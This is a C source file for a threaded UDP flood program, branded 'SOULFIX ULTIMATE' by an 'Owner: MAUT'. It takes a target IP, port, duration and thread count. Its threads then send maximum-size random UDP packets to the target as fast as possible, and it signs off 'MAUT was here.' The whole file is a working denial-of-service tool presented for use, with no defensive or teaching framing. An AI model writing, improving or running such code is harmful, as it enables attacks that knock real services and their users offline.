#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <errno.h>

#define MAX_THREADS 1000    // Adjust based on system limits
#define PAYLOAD_SIZE 65507  // Max UDP packet size
#define FLOOD_DELAY 0       // Microseconds between packets (0 = fastest)

// Global attack parameters
char *TARGET_IP;
int TARGET_PORT;
int ATTACK_TIME;
int THREAD_COUNT;

// Thread function
void *flood(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    time_t start_time = time(NULL);
    time_t end_time = start_time + ATTACK_TIME;

    // Create socket (UDP flood)
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        perror("Socket error");
        pthread_exit(NULL);
    }

    // Optimize socket for speed
    int broadcast = 1;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));

    // Target setup
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    server_addr.sin_addr.s_addr = inet_addr(TARGET_IP);

    // Random payload
    char payload[PAYLOAD_SIZE];
    for (int i = 0; i < PAYLOAD_SIZE; i++) {
        payload[i] = rand() % 256;
    }

    printf("[+] Thread %ld attacking %s:%d\n", (long)arg, TARGET_IP, TARGET_PORT);

    // Flood loop (MAX SPEED)
    while (time(NULL) < end_time) {
        sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
        usleep(FLOOD_DELAY);  // Optional delay (0 = fastest)
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    printf("\n=== SOULFIX ULTIMATE (THREADED) ===\n");
    printf(">> Owner: MAUT <<\n");
    printf(">> 4x Power Upgrade <<\n\n");

    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        printf("Example: %s 1.1.1.1 80 60 1000\n", argv[0]);
        exit(1);
    }

    // Set attack parameters
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    THREAD_COUNT = atoi(argv[4]);

    if (THREAD_COUNT > MAX_THREADS) {
        printf("[!] Warning: Too many threads (max %d)\n", MAX_THREADS);
        THREAD_COUNT = MAX_THREADS;
    }

    printf("[+] Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("[+] Attack Time: %d seconds\n", ATTACK_TIME);
    printf("[+] Threads: %d\n", THREAD_COUNT);
    printf("[+] Starting attack...\n\n");

    // Seed random for payload
    srand(time(NULL));

    // Create threads
    pthread_t threads[MAX_THREADS];
    for (long i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, flood, (void*)i) != 0) {
            perror("Thread error");
            continue;
        }
    }

    // Wait for threads to finish
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n[+] Attack finished.\n");
    printf("[+] MAUT was here.\n");

    return 0;
}
